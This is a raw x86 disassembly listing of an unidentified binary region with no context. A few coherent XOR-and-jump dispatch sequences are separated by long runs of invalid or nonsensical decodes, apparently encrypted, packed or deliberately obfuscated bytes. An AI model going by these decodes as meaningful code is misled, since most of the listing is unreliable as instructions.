  407cbc:	mov    ebx,DWORD PTR [ebp-0x10]
  407cbf:	sub    ebx,edi
  407cc1:	cmp    ebx,edx
  407cc3:	jmp    0x407e74
  407cc8:	imul   esp,DWORD PTR [eax],0xfffffff2
  407ccb:	mov    cl,0x71
  407ccd:	jno    0x407d38
  407ccf:	loopne 0x407d06
  407cd1:	(bad)  
  407cd2:	cmp    bh,BYTE PTR [eax-0x510ecbb8]
  407cd8:	test   edi,ecx
  407cda:	jle    0x407d5a
  407cdc:	mov    bh,BYTE PTR [edi+0x7e]
  407cdf:	jle    0x407c9c
  407ce1:	push   ecx
  407ce2:	jns    0x407cb6
  407ce4:	rcr    DWORD PTR [ecx],cl
  407ce6:	cmc    
  407ce7:	fdivr  DWORD PTR [bx+di+0x78]
  407ceb:	mov    ah,0xc9
  407ced:	xchg   ecx,eax
  407cee:	jecxz  0x407d2e
  407cf0:	les    esi,FWORD PTR [esi+0x72f5e3c1]
  407cf6:	xchg   esp,eax
  407cf7:	out    0xba,eax
  407cf9:	inc    ebp
  407cfa:	or     BYTE PTR [ecx],ch
  407cfc:	xor    eax,0xd05a4c30
  407d01:	add    al,BYTE PTR [ecx]
  407d03:	call   0x27232c09
  407d08:	push   edx
  407d09:	data16 sbb al,0x98
  407d0c:	fisubr WORD PTR [esi+0x6]
  407d0f:	inc    ecx
  407d10:	mov    ah,0x74
  407d12:	or     BYTE PTR [eax],al
  407d14:	in     eax,dx
  407d15:	push   ebx
  407d16:	imul   edx,ebx,0x7750b810
  407d1c:	xor    ebx,eax
  407d1e:	push   esp
  407d1f:	shr    DWORD PTR [ebp+0xc991f9a],1
  407d25:	mov    ah,0x77
  407d27:	xchg   esp,eax
  407d28:	sub    ebx,DWORD PTR [ecx-0x7ce2a6c4]
  407d2e:	(bad)  
  407d2f:	xlat   BYTE PTR ds:[ebx]
  407d30:	pop    edx
  407d31:	fdivr  QWORD PTR [ebx+ebp*8]
  407d34:	rcr    dh,0x6a
  407d37:	jmp    0x407db2
  407d39:	ret    
  407d3a:	data16 add dh,BYTE PTR [eax]
  407d3d:	test   eax,0xffb2f99a
  407d42:	call   0xaeb5f5be
  407d47:	jnp    0x407d47
  407d49:	es pop ds
  407d4b:	adc    al,BYTE PTR [ebp-0x72]
  407d4e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d4f:	mov    eax,0x725476df
  407d54:	outs   dx,DWORD PTR ds:[esi]
  407d55:	jb     0x407d64
  407d57:	out    dx,al
  407d58:	mov    BYTE PTR [ebx-0xda7cbc6],0xf
  407d5f:	mov    bh,0x91
  407d61:	jbe    0x407cf0
  407d63:	in     al,dx
  407d64:	loope  0x407d18
  407d66:	pop    ds
  407d67:	push   cs
  407d68:	std    
  407d69:	out    dx,eax
  407d6a:	push   ecx
  407d6b:	(bad)
  407d6f:	loop   0x407d05
  407d71:	lods   eax,DWORD PTR ds:[esi]
  407d72:	and    ebx,0xffffffd6
  407d75:	inc    esp
  407d76:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d78:	movaps xmm2,xmm3
  407d7b:	jae    0x407dc0
  407d7d:	push   esi
  407d7e:	aam    0x24
  407d80:	dec    ebp
  407d81:	out    dx,eax
  407d82:	jge    0x407d6f
  407d84:	(bad)  
  407d85:	push   0xbcfd162a
  407d8a:	fwait
  407d8b:	jge    0x407d8a
  407d8d:	loop   0x407da6
  407d8f:	cmp    al,BYTE PTR [edx+0x6a7be17a]
  407d95:	push   eax
  407d96:	cmc    
  407d97:	inc    eax
  407d98:	dec    edi
  407d99:	pop    ss
  407d9a:	fxam   
  407d9c:	shr    DWORD PTR [esi],1
  407d9e:	(bad)  
  407d9f:	in     eax,dx
  407da0:	adc    bl,BYTE PTR [ebx-0x70]
  407da3:	cwde   
  407da4:	xor    eax,0x59c6f51e
  407da9:	mov    dh,0xd0
  407dab:	jnp    0x407e0a
  407dad:	outs   dx,DWORD PTR ds:[esi]
  407dae:	jg     0x407d3f
  407db0:	push   esp
  407db1:	imul   ebx,DWORD PTR [esi-0x6a],0xd
  407db5:	sbb    BYTE PTR [eax],dl
  407db7:	sub    ah,0x14
  407dba:	mov    ds:0x58059acd,eax
  407dbf:	aad    0x93
  407dc1:	cmp    dl,ch
  407dc3:	xchg   esi,eax
  407dc4:	pop    es
  407dc5:	mov    edi,0x65b09d62
  407dca:	xchg   ecx,eax
  407dcb:	jl     0x407dce
  407dcd:	bound  eax,QWORD PTR [ebx]
  407dcf:	popa   
  407dd0:	dec    ebp
  407dd1:	(bad)  
  407dd2:	in     al,0x38
  407dd4:	pushf  
  407dd5:	dec    esp
  407dd6:	stos   BYTE PTR es:[edi],al
  407dd7:	inc    esp
  407dd8:	mov    al,ds:0x6aea1569
  407ddd:	fstp   TBYTE PTR [ebp-0x49529dc3]
  407de3:	fnstenv [ebx+0x47]
  407de6:	ds repz addr16 mov al,0x64
  407deb:	mov    dl,0xca
  407ded:	js     0x407e5a
  407def:	fs dec esp
  407df1:	paddq  mm7,QWORD PTR [edx]
  407df4:	inc    esp
  407df5:	pop    edx
  407df6:	jmp    0xfe024c32
  407dfb:	and    eax,DWORD PTR [eax+eiz*1+0x503d3e61]
  407e02:	lods   eax,DWORD PTR ds:[esi]
  407e03:	gs xchg ebx,eax
  407e05:	hlt    
  407e06:	out    dx,eax
  407e07:	mov    esp,0x5913c350
  407e0c:	pop    edi
  407e0d:	es lock jmp 0xb76b:0x36e92923
  407e16:	(bad)  
  407e19:	dec    ecx
  407e1a:	mov    WORD PTR [ebx],gs
  407e1c:	je     0x407e9b
  407e1e:	push   ds
  407e1f:	addr16 and al,0xe3
  407e22:	and    DWORD PTR [ebx],0x8f2a59da
  407e28:	add    ax,0xd6b5
  407e2c:	or     cl,0xf9
  407e2f:	mov    BYTE PTR [ebx+ebx*1+0x36],bh
  407e33:	mov    dl,0x2e
  407e35:	push   ss
  407e36:	imul   eax,DWORD PTR [ecx-0x2352f2ee],0x1fd35391
  407e40:	add    bl,BYTE PTR [ecx+ebx*4-0x4f]
  407e44:	xchg   ebp,eax
  407e45:	aaa    
  407e46:	pmaxub mm6,QWORD PTR [eax+esi*4+0x3d]
  407e4b:	hlt    
  407e4c:	fwait
  407e4d:	ja     0x407ea1
  407e4f:	fistp  WORD PTR [edi-0x5bf18e15]
  407e56:	adc    ebx,ecx
  407e58:	pop    edx
  407e59:	pop    ss
  407e5a:	lock pop eax
  407e5c:	into   
  407e5d:	ret    
  407e5e:	je     0x407e8c
  407e60:	xor    edx,DWORD PTR [edi-0x1f]
  407e63:	adc    edx,edx
  407e65:	mov    cl,0xe3
  407e67:	adc    BYTE PTR [ecx],al
  407e69:	icebp  
  407e6a:	and    al,0xf8
  407e6c:	add    eax,0x26d3ba30
  407e71:	and    eax,0x870f1bde
  407e76:	or     BYTE PTR [eax],al
  407e78:	add    BYTE PTR [eax],al
  407e7a:	mov    edx,DWORD PTR [ebp-0x2c]
  407e7d:	jmp    0x408770
  407e82:	mov    edx,DWORD PTR [ebp-0x34]
  407e85:	mov    edi,DWORD PTR [ebp-0x4]
  407e88:	xor    edx,eax
  407e8a:	xor    edi,eax
  407e8c:	jmp    0x40803d
  407e91:	(bad)  
  407e92:	in     al,dx
  407e93:	test   eax,0x4771b1f1
  407e98:	call   0x1b74fcaf
  407e9d:	or     DWORD PTR [edi-0x32ee8f58],0x7e
  407ea4:	jle    0x407e30
  407ea6:	jg     0x407f26
  407ea8:	jle    0x407eb1
  407eaa:	or     BYTE PTR [edi+eiz*8+0x3d],ah
  407eae:	inc    ebx
  407eaf:	pop    ss
  407eb0:	pop    edi
  407eb1:	das    
  407eb2:	gs aas 
  407eb4:	fwait
  407eb5:	xchg   ebx,eax
  407eb6:	ror    DWORD PTR [eax+0x6505977e],1
  407ebc:	xchg   ebp,eax
  407ebd:	daa    
  407ebe:	jb     0x407ec1
  407ec0:	inc    ecx
  407ec1:	test   DWORD PTR [esi+edx*1],0x887ec47a
  407ec8:	xor    al,0xd3
  407eca:	xor    al,0x79
  407ecc:	jae    0x407e91
  407ece:	mov    dl,0xbf
  407ed0:	sbb    al,0x8c
  407ed2:	pop    ebx
  407ed3:	sub    cl,BYTE PTR [edx+0x4de9d6b5]
  407ed9:	leave  
  407eda:	pop    ecx
  407edb:	sbb    eax,0xc4912afe
  407ee0:	ins    BYTE PTR es:[edi],dx
  407ee1:	push   eax
  407ee2:	jo     0x407ecb
  407ee4:	mov    ss,WORD PTR [ebx+eiz*8]
  407ee7:	inc    esp
  407ee8:	scas   eax,DWORD PTR es:[edi]
  407ee9:	pop    ecx
  407eea:	dec    edi
  407eeb:	mov    ch,cl
  407eed:	out    dx,eax
  407eee:	mov    dl,0xc4
  407ef0:	test   BYTE PTR [ebx-0x75dd7691],ch
  407ef6:	scas   al,BYTE PTR es:[edi]
  407ef7:	fs data16 jnp 0x407f55
  407efb:	mov    cl,0x43
  407efd:	add    al,0xc6
  407eff:	and    eax,0xe1b70a65
  407f04:	outs   dx,DWORD PTR ds:[esi]
  407f05:	aam    0x43
  407f07:	in     al,dx
  407f08:	leave  
  407f09:	dec    ebp
  407f0a:	and    DWORD PTR [ebx+0x58],0xffffff93
  407f0e:	sbb    dl,BYTE PTR [edi-0x77]
  407f11:	mov    bl,0x20
  407f13:	mov    ch,0xad
  407f15:	or     eax,0x33df5e30
  407f1a:	cld    
  407f1b:	xchg   edx,eax
  407f1c:	xchg   esp,eax
  407f1d:	test   DWORD PTR [ecx-0x46],eax
  407f20:	push   0x9102cfe9
  407f25:	pushf  
  407f26:	ds nop
  407f28:	cli    
  407f29:	or     DWORD PTR [edi+0x51],esi
  407f2c:	dec    edx
  407f2d:	adc    al,0xb2
  407f2f:	mov    eax,ds:0xd9b143b1
  407f34:	mov    edx,0xc84c5301
  407f39:	xor    DWORD PTR [eax],esp
  407f3b:	pop    ebx
  407f3c:	adc    al,BYTE PTR [ebp+0x14]
  407f3f:	sbb    eax,0x3f353dee
  407f44:	loopne 0x407fbc
  407f46:	jns    0x407f84
  407f48:	or     eax,0x112a38a
  407f4d:	sti    
  407f4e:	mov    edx,DWORD PTR [edi+0x77]
  407f51:	add    eax,0xaf73533e
  407f56:	push   ds
  407f57:	je     0x407fa6
  407f59:	dec    ecx
  407f5a:	mov    esi,0xf1d0520d
  407f5f:	shl    BYTE PTR [edi-0x2b],cl
  407f62:	repnz inc edx
  407f64:	or     BYTE PTR [edx+eiz*1+0x25d9a5c2],bh
  407f6b:	shl    DWORD PTR [ecx+0x30ac9423],1
  407f71:	cmp    BYTE PTR [esi-0x73],0x14
  407f75:	xchg   esi,eax
  407f76:	fxch   st(7)
  407f78:	mov    al,ds:0x9b8ac09d
  407f7d:	inc    ebx
  407f7e:	scas   al,BYTE PTR es:[edi]
  407f7f:	add    al,0xe5
  407f81:	in     eax,dx
  407f82:	xchg   bh,dl
  407f84:	mov    edx,0x71353274
  407f89:	in     eax,dx
  407f8a:	cmp    al,0x3d
  407f8c:	or     DWORD PTR [ebx],eax
  407f8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f90:	outs   dx,DWORD PTR ds:[esi]
  407f91:	idiv   BYTE PTR [edi-0x71]
  407f94:	xchg   edx,eax
  407f95:	mov    esi,0x353350cc
  407f9a:	fcomp  DWORD PTR ds:0x2a6aba9f
  407fa0:	and    BYTE PTR [eax],bl
  407fa2:	sub    bl,cl
  407fa4:	fwait
  407fa5:	mov    eax,ds:0x7f76d0db
  407faa:	hlt    
  407fab:	fbld   TBYTE PTR [ebx-0x1f]
  407fae:	xchg   edx,eax
  407faf:	loope  0x407f4e
  407fb1:	loopne 0x407ffd
  407fb3:	arpl   WORD PTR [edi+0x69f135d3],di
  407fb9:	xchg   ecx,eax
  407fba:	hlt    
  407fbb:	xchg   DWORD PTR [edx],ecx
  407fbd:	pushf  
  407fbe:	mov    edi,0x44cb330f
  407fc3:	push   esp
  407fc4:	out    dx,al
  407fc5:	loop   0x407fe1
  407fc7:	cmp    BYTE PTR [edi],dl
  407fc9:	lds    ebp,FWORD PTR [edi+0x7f]
  407fcc:	mov    esp,0xc01f0483
  407fd1:	xor    esi,edi
  407fd3:	mov    ebx,0x41b3da8
  407fd8:	or     BYTE PTR [esi-0xc4d4333],cl
  407fde:	adc    eax,0x3c218def
  407fe3:	or     ebp,edx
  407fe5:	(bad)  
  407fe6:	icebp  
  407fe7:	(bad)  
  407fe8:	sub    al,0x63
  407fea:	inc    edx
  407feb:	iret   
  407fec:	sbb    ebx,DWORD PTR [edi-0x5ac4dfe1]
  407ff2:	xchg   ecx,eax
  407ff3:	lea    eax,[eax]
  407ff5:	jecxz  0x407f84
  407ff7:	out    0x83,al
  407ff9:	adc    al,0x3
  407ffb:	fidivr WORD PTR [ecx+0x9]
  407ffe:	je     0x40803b
  408000:	test   DWORD PTR ds:0x3c1b4801,ebp
  408006:	mov    ebp,0x2b17e52f
  40800b:	or     ah,0x6b
  40800e:	add    al,0x69
  408010:	mov    bl,0x38
  408012:	pop    edx
  408013:	test   BYTE PTR ss:[esi],al
  408016:	into   
  408017:	call   0x5f6534cd
  40801c:	pusha  
  40801d:	pop    edx
  40801e:	fbld   TBYTE PTR [esp+edi*1]
  408021:	push   eax
  408022:	mov    dl,0x6e
  408024:	xchg   bl,bl
  408026:	outs   dx,BYTE PTR ds:[esi]
  408027:	scas   eax,DWORD PTR es:[edi]
  408028:	jmp    0x3cf1:0xfeee3feb
  40802f:	js     0x407fff
  408031:	lock dec ebx
  408033:	push   ss
  408034:	mov    al,ds:0x6d7e79e2
  408039:	push   0xffffff82
  40803b:	adc    BYTE PTR [edi-0x2efc06fd],al
  408041:	imul   edx,edi
  408044:	mov    edi,DWORD PTR [ebp-0x8]
  408047:	mov    ebx,DWORD PTR [ebp-0x10]
  40804a:	sub    ebx,edi
  40804c:	cmp    ebx,edx
  40804e:	ja     0x40805c
  408054:	mov    edx,DWORD PTR [ebp-0x30]
  408057:	jmp    0x408770
  40805c:	mov    edx,DWORD PTR [ebp-0x38]
  40805f:	mov    edi,DWORD PTR [ebp-0x4]
  408062:	xor    edx,eax
  408064:	xor    edi,eax
  408066:	add    edi,ecx
  408068:	jmp    0x408219
  40806d:	jmp    0x958e95d5
  408072:	push   0x185c6171
  408077:	mov    ch,0xe0
  408079:	lea    ecx,[edx-0x4c]
  40807c:	xor    BYTE PTR [ebp-0x75818136],ch
  408082:	jg     0x408102
  408084:	jle    0x408021
  408086:	dec    edx
  408087:	or     eax,0xbcf97ad1
  40808c:	test   bh,al
  40808e:	push   ecx
  40808f:	and    edi,DWORD PTR ds:0xfd92045e
  408095:	das    
  408096:	call   0x85f4:0x28cbd1df
  40809d:	cdq    
  40809e:	rcr    BYTE PTR [eax],0x4c
  4080a1:	loope  0x4080d3
  4080a3:	xlat   BYTE PTR ds:[ebx]
  4080a4:	call   0xbd1d8f9a
  4080a9:	sahf   
  4080aa:	cli    
  4080ab:	dec    ebp
  4080ac:	iret   
  4080ad:	sbb    eax,0x294a2ec4
  4080b2:	(bad)  
  4080b3:	and    al,0x61
  4080b5:	jne    0x4080d9
  4080b7:	xchg   DWORD PTR [ebx],ebx
  4080b9:	imul   edx,eax,0x0
  4080bc:	or     BYTE PTR [ebx+0x13],dh
  4080bf:	mov    ecx,0x9c701759
  4080c4:	test   ch,ah
  4080c6:	imul   esi,DWORD PTR [edi+edx*2-0x64],0xf6c5de40
  4080ce:	jne    0x4080f3
  4080d0:	jns    0x4080bf
  4080d2:	fs (bad) 
  4080d4:	mov    eax,0xf9ecbc8f
  4080d9:	jl     0x408133
  4080db:	retf   0x24be
  4080de:	sub    bl,BYTE PTR [edx-0x46f24a61]
  4080e4:	and    BYTE PTR [ebx],0x36
  4080e7:	mov    cl,BYTE PTR [eax]
  4080e9:	ret    
  4080ea:	pop    eax
  4080eb:	in     al,0x65
  4080ed:	ja     0x4080f0
  4080ef:	sahf   
  4080f0:	in     al,0x24
  4080f2:	add    ebx,DWORD PTR [eax+0x5f]
  4080f5:	pop    es
  4080f6:	xor    BYTE PTR [ebp-0x14],ch
  4080f9:	retf   
  4080fa:	xchg   ecx,eax
  4080fb:	sbb    BYTE PTR [eax+0x2c],dh
  4080fe:	pop    edi
  4080ff:	inc    ecx
  408100:	lock adc DWORD PTR [eax+0x67],eax
  408104:	in     eax,dx
  408105:	add    al,0x8d
  408107:	push   edx
  408108:	adc    al,0xc9
  40810a:	dec    ebp
  40810b:	pop    ss
  40810c:	push   edi
  40810d:	loopne 0x4080cc
  40810f:	fbld   TBYTE PTR [eax-0x39b88e76]
  408115:	inc    eax
  408116:	or     DWORD PTR [esp+esi*8+0x7],ebx
  40811a:	scas   al,BYTE PTR es:[edi]
  40811b:	pop    ds
  40811c:	jb     0x408102
  40811e:	xchg   ebp,eax
  40811f:	fnsave [ecx]
  408121:	mov    edi,0x712ffcd8
  408126:	jbe    0x4080f4
  408128:	fimul  WORD PTR [esi-0x198a8e08]
  40812e:	xchg   DWORD PTR [esi+esi*2],esi
  408131:	sbb    al,0x7f
  408133:	jmp    0x408179
  408135:	inc    ebp
  408136:	inc    esp
  408137:	mov    ds:0x4652c13b,al
  40813c:	mov    ecx,0x5f68e852
  408141:	add    al,0x73
  408143:	ret    
  408144:	lea    esp,ds:0xaf133845
  40814a:	(bad)  
  40814b:	in     al,dx
  40814c:	(bad)  
  40814d:	int    0x8f
  40814f:	cmp    BYTE PTR [ecx],cl
  408151:	outs   dx,DWORD PTR ds:[esi]
  408152:	aam    0x5d
  408154:	lods   al,BYTE PTR ds:[esi]
  408155:	cmp    BYTE PTR [esi+0x134f1d0a],ah
  40815b:	cmp    esi,DWORD PTR [edx+esi*4+0x79]
  40815f:	xlat   BYTE PTR ds:[ebx]
  408160:	shl    BYTE PTR [edi+0x38b76744],0x0
  408167:	lods   al,BYTE PTR ds:[esi]
  408168:	mov    eax,0xc2289607
  40816d:	xchg   edx,eax
  40816e:	aam    0xcb
  408170:	loop   0x40818d
  408172:	clc    
  408173:	sub    al,0x67
  408175:	repz rcr BYTE PTR [eax-0x4b1251ca],0xfb
  40817d:	or     edi,esi
  40817f:	ins    BYTE PTR es:[edi],dx
  408180:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408181:	aad    0x86
  408183:	fs hlt 
  408185:	or     DWORD PTR [edi],edx
  408187:	sbb    BYTE PTR [ebx+0x53],ch
  40818a:	lods   al,BYTE PTR ds:[esi]
  40818b:	out    0x6,eax
  40818d:	aaa    
  40818e:	aaa    
  40818f:	xchg   edi,esi
  408191:	sbb    DWORD PTR [ebx+0x3f824b1c],ebx
  408197:	adc    BYTE PTR [edx],ch
  408199:	jge    0x4081d6
  40819b:	shr    BYTE PTR [esp+eiz*8-0x29d6b9a],1
  4081a2:	sub    eax,0x8c466e1d
  4081a7:	jle    0x4081bc
  4081a9:	pop    ss
  4081aa:	shl    DWORD PTR [edx],cl
  4081ac:	dec    eax
  4081ad:	sbb    DWORD PTR [esi+0x4b],edx
  4081b0:	or     eax,0xc81a4ff6
  4081b5:	cdq    
  4081b6:	popa   
  4081b7:	jle    0x4081e3
  4081b9:	xor    ah,BYTE PTR [ecx+0x1e]
  4081bc:	pop    ebx
  4081bd:	dec    ebx
  4081be:	mov    ebp,DWORD PTR [ecx-0xe8ec468]
  4081c4:	aad    0xe8
  4081c6:	add    edx,DWORD PTR [esi+0x5b61b03e]
  4081cc:	sbb    BYTE PTR [ebx*8+0x5ca8acdc],ah
  4081d3:	(bad)  
  4081d4:	out    dx,al
  4081d5:	aam    0x8e
  4081d7:	stc    
  4081d8:	pop    es
  4081d9:	pop    edx
  4081da:	xchg   edi,eax
  4081db:	es sub al,0xaa
  4081de:	les    esp,FWORD PTR [ebp-0x1c]
  4081e1:	add    dh,BYTE PTR ds:0xddc94fd3
  4081e7:	aam    0x6d
  4081e9:	bound  esi,QWORD PTR [edx-0x40]
  4081ec:	xchg   BYTE PTR [ebp-0x72],bh
  4081ef:	mov    esp,0xfe89f4cb
  4081f4:	pushf  
  4081f5:	cmc    
  4081f6:	sbb    bh,al
  4081f8:	pop    edx
  4081f9:	pop    ds
  4081fa:	out    0x17,eax
  4081fc:	hlt    
  4081fd:	js     0x408275
  4081ff:	sub    al,0x50
  408201:	and    BYTE PTR [ebx+0x6d],al
  408204:	pop    eax
  408205:	mov    WORD PTR [ebp+0x73e2fd33],fs
  40820b:	xchg   DWORD PTR [ebp-0x78],ecx
  40820e:	xor    BYTE PTR [ebx-0x1504b28f],dl
  408214:	jne    0x40819a
  408216:	inc    ecx
  408217:	cdq    
  408218:	pusha  
  408219:	add    edx,ecx
  40821b:	jmp    0x4083cc
  408220:	dec    esp
  408221:	adc    BYTE PTR [edi],bh
  408223:	add    eax,DWORD PTR [ebx-0x2f]
  408226:	push   eax
  408227:	push   ecx
  408228:	jl     0x4082a4
  40822a:	jmp    0x3984:0xf0c24c62
  408231:	enter  0x7e7e,0x8a
  408235:	jg     0x4082b5
  408237:	jle    0x40827b
  408239:	adc    al,0xbf
  40823b:	mov    DWORD PTR [ecx],eax
  40823d:	icebp  
  40823e:	iret   
  40823f:	mov    al,bl
  408241:	mov    WORD PTR [edx+0x2db1e494],es
  408247:	sub    DWORD PTR [esi-0x41ac9f03],esi
  40824d:	xchg   edx,eax
  40824e:	pusha  
  40824f:	icebp  
  408250:	nop
  408251:	xor    eax,0xa7fbf2bd
  408256:	xor    esi,edx
  408258:	mov    bh,0x47
  40825a:	mov    eax,0x87820d39
  40825f:	repz sbb eax,0x7f6cc555
  408265:	bound  ebx,QWORD PTR ds:0x95eee94a
  40826b:	inc    ebp
  40826c:	jno    0x4082d7
  40826e:	mov    ebp,0xe65682fa
  408273:	lods   al,BYTE PTR ds:[esi]
  408274:	pop    ebx
  408275:	rcr    BYTE PTR [esi],1
  408277:	les    esi,FWORD PTR [edx-0x65]
  40827a:	lahf   
  40827b:	add    ch,bh
  40827d:	sub    eax,0x6141f9aa
  408282:	pop    es
  408283:	mov    ah,dh
  408285:	dec    edx
  408286:	pop    eax
  408287:	stc    
  408288:	addr16 jp 0x408274
  40828b:	cmp    ebx,esi
  40828d:	leave  
  40828e:	stos   DWORD PTR es:[edi],eax
  40828f:	out    dx,eax
  408290:	mov    al,ds:0xc7d43362
  408295:	mov    ebx,0x7fb022d4
  40829a:	repz mov esi,0x364ccd6d
  4082a0:	retf   0x2597
  4082a3:	dec    esp
  4082a4:	sbb    ecx,edi
  4082a6:	(bad)  
  4082a7:	adc    dh,BYTE PTR [eax]
  4082a9:	aaa    
  4082aa:	pop    ecx
  4082ab:	mov    cs:0x428b98ed,eax
  4082b1:	sar    edx,1
  4082b3:	xchg   edi,eax
  4082b4:	sbb    ecx,edx
  4082b6:	stos   BYTE PTR es:[edi],al
  4082b7:	stos   DWORD PTR es:[edi],eax
  4082b8:	shr    BYTE PTR [edi*1-0x662e043],cl
  4082bf:	aad    0x92
  4082c1:	add    DWORD PTR [esi+0x68d41d33],ecx
  4082c7:	jg     0x408294
  4082c9:	sub    ch,dh
  4082cb:	fst    DWORD PTR [ecx+0x54f2aca3]
  4082d1:	lods   eax,DWORD PTR ds:[esi]
  4082d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4082d3:	mov    al,bh
  4082d5:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4082d7:	scas   eax,DWORD PTR es:[edi]
  4082d8:	into   
  4082d9:	cmp    bh,BYTE PTR [ecx+0x7b671b66]
  4082df:	adc    bl,BYTE PTR [esi]
  4082e1:	shr    DWORD PTR ds:0x8b442693,cl
  4082e7:	push   ebx
  4082e8:	sbb    BYTE PTR [ebx],dh
  4082ea:	repz xor eax,0xe7fd51ab
  4082f0:	mov    dl,0xa6
  4082f2:	stc    
  4082f3:	rcr    BYTE PTR [edx+edx*2+0x2a],0x23
  4082f8:	and    edi,edx
  4082fa:	pop    ss
  4082fb:	or     dl,BYTE PTR [esi]
  4082fd:	xchg   esp,eax
  4082fe:	pop    edi
  4082ff:	or     esp,esi
  408301:	mov    ds:0x5d857243,eax
  408306:	je     0x40836c
  408308:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408309:	call   0x618f1d6c
  40830e:	or     BYTE PTR [ebp-0x58],dl
  408311:	aad    0x6c
  408313:	(bad)  
  408314:	std    
  408315:	dec    ebp
  408316:	push   esi
  408317:	aam    0x96
  408319:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40831a:	mov    ch,0x2f
  40831c:	xchg   esp,eax
  40831d:	jns    0x408300
  40831f:	call   0xd42ad4b9
  408324:	adc    ebx,edx
  408326:	and    eax,0xb18d6981
  40832b:	shl    BYTE PTR [edi+0x5f],0xde
  40832f:	loope  0x40833f
  408331:	dec    edi
  408332:	mov    esp,0x66d08861
  408337:	les    eax,FWORD PTR [edx-0x24]
  40833a:	adc    al,0x3f
  40833c:	xor    cl,BYTE PTR [edi-0x65813aa2]
  408342:	mov    esi,0x28d061b4
  408347:	and    esi,DWORD PTR [ebp+0x8e6f018]
  40834d:	mov    ds:0xabb32dee,al
  408352:	popa   
  408353:	out    0xd0,eax
  408355:	add    dh,0xa1
  408358:	pop    es
  408359:	mov    cs:0x55afcc91,eax
  40835f:	ins    BYTE PTR es:[edi],dx
  408360:	and    BYTE PTR ss:[ecx],bh
  408363:	idiv   dh
  408365:	pop    ecx
  408366:	loopne 0x408386
  408368:	and    al,0xc3
  40836a:	repnz xor al,0xf8
  40836d:	pop    eax
  40836e:	out    dx,al
  40836f:	push   0xfffffff9
  408371:	jne    0x40839e
  408373:	gs xor al,0xbb
  408376:	jmp    0x4083ec
  408378:	popf   
  408379:	mov    esp,0x287131ae
  40837e:	xlat   BYTE PTR ds:[ebx]
  40837f:	int3   
  408380:	push   esp
  408381:	cmp    eax,0xc80b180e
  408386:	or     ecx,DWORD PTR [ebx]
  408388:	rol    ebx,1
  40838a:	les    esi,FWORD PTR [edx]
  40838c:	adc    DWORD PTR [eax],edx
  40838e:	repnz add esi,eax
  408391:	sbb    edx,ebp
  408393:	mov    ds:0x20123fdb,al
  408398:	jmp    0x40833a
  40839a:	ins    DWORD PTR es:[edi],dx
  40839b:	ret    0x1279
  40839e:	je     0x408349
  4083a0:	dec    ebx
  4083a1:	and    edi,esp
  4083a3:	lods   al,BYTE PTR ds:[esi]
  4083a4:	pop    ebp
  4083a5:	les    edx,FWORD PTR [edx+eiz*4-0x2]
  4083a9:	or     ecx,DWORD PTR [edi+ecx*2-0x21]
  4083ad:	fs push 0xffffffdd
  4083b0:	mov    ds:0x75bddf9d,al
  4083b5:	aad    0x3d
  4083b7:	pop    edx
  4083b8:	sbb    cl,BYTE PTR [ebx-0x2c]
  4083bb:	outs   dx,DWORD PTR ds:[esi]
  4083bc:	aam    0x51
  4083be:	push   ds
  4083bf:	push   0x50
  4083c1:	(bad)
  4083c5:	jns    0x40838a
  4083c7:	pop    edi
  4083c8:	push   cs
  4083c9:	add    ah,BYTE PTR [edx+0x0]
  4083cc:	imul   edx,edi
  4083cf:	mov    edi,DWORD PTR [ebp-0x8]
  4083d2:	mov    ebx,DWORD PTR [ebp-0x10]
  4083d5:	sub    ebx,edi
  4083d7:	jmp    0x408588
  4083dc:	and    BYTE PTR [ebx-0x6c4aede2],ch
  4083e2:	xor    BYTE PTR [ecx-0x29441d92],ch
  4083e8:	inc    esp
  4083e9:	pop    esi
  4083ea:	mov    ebp,0x7ec95503
  4083ef:	jle    0x40837b
  4083f1:	jg     0x408471
  4083f3:	jle    0x408473
  4083f5:	sub    DWORD PTR [edi-0x6251a7a1],esi
  4083fb:	popa   
  4083fc:	aam    0xf6
  4083fe:	adc    DWORD PTR [edi],edx
  408400:	test   BYTE PTR [esi+0x664e6015],dl
  408406:	and    dl,BYTE PTR [esi]
  408408:	pop    edi
  408409:	jnp    0x4083ca
  40840b:	(bad)  
  40840c:	jno    0x40838f
  40840e:	xor    eax,0x89213e3a
  408413:	xchg   bl,bl
  408415:	out    dx,al
  408416:	push   edx
  408417:	mov    edx,DWORD PTR [edx]
  408419:	xor    eax,0x9c080a8a
  40841e:	push   ds
  40841f:	push   0xba435104
  408424:	pop    edi
  408425:	jecxz  0x40847f
  408427:	pop    ss
  408428:	sub    BYTE PTR [edi+0x546dbed],0x9
  40842f:	jno    0x40848a
  408431:	popf   
  408432:	jns    0x4083c6
  408434:	je     0x408452
  408436:	in     al,dx
  408437:	push   cs
  408438:	out    0x85,al
  40843a:	clc    
  40843b:	jne    0x408434
  40843d:	inc    ebx
  40843e:	xchg   ebp,eax
  40843f:	add    ecx,DWORD PTR [ecx-0x3ef40a40]
  408445:	mov    dh,0x90
  408447:	addr16 cmp ebp,edx
  40844a:	add    ebp,DWORD PTR [edx]
  40844c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40844d:	push   ecx
  40844e:	mov    DWORD PTR [esi+0x35e3786e],ebp
  408454:	mov    bh,0x67
  408456:	gs inc esi
  408458:	lea    ebp,[edx-0x5912279b]
  40845e:	add    al,bl
  408460:	out    dx,eax
  408461:	xor    ch,BYTE PTR [eax+0x6bafea46]
  408467:	mov    DWORD PTR [ecx+0x54eafaa7],0xf2d6e7e5
  408471:	mov    esi,0xf7045889
  408476:	add    eax,0x4655af63
  40847b:	xchg   ebp,eax
  40847c:	retfw  0xbc67
  408480:	test   BYTE PTR [eax],0x0
  408483:	adc    al,BYTE PTR [esi-0x5a]
  408486:	in     eax,0xb6
  408488:	pop    esp
  408489:	clc    
  40848a:	shrd   DWORD PTR [ecx-0x7b],esi,cl
  40848e:	repnz neg BYTE PTR [edx]
  408491:	lea    ebp,[eax]
  408493:	dec    esp
